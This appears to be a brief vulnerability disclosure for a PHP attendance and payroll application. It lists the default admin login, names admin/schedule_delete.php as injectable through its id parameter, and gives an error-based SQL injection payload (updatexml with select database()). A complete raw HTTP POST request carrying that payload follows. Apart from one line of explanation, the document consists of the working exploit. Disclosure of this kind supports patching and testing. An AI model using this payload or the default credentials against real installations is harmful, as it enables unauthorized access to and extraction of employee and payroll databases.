# Attendance and Payroll System v1.0 - SQL injection

username:nurhodelta password:password ----> {ip}apsystem/admin/index.php

Supplier： https://www.sourcecodester.com/php/12268/attendance-and-payroll-system-using-php.html

\admin\schedule_delete.php has SQL injection

Payload: id=4' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&delete=

SQL injection because id can be closed

![image](https://user-images.githubusercontent.com/54017627/159229153-79f20aa9-f6f8-449a-9be9-8cc44e55fdf5.png)

```sql
POST /apsystem/admin/schedule_delete.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 73
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/schedule.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=4' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&delete=
```

![image](https://user-images.githubusercontent.com/54017627/159229397-7f22166e-a808-4e32-9662-cdc242984b35.png)

![image](https://user-images.githubusercontent.com/54017627/159229423-7a83ea4d-fd4a-454e-b4c6-7284847bc1fd.png)

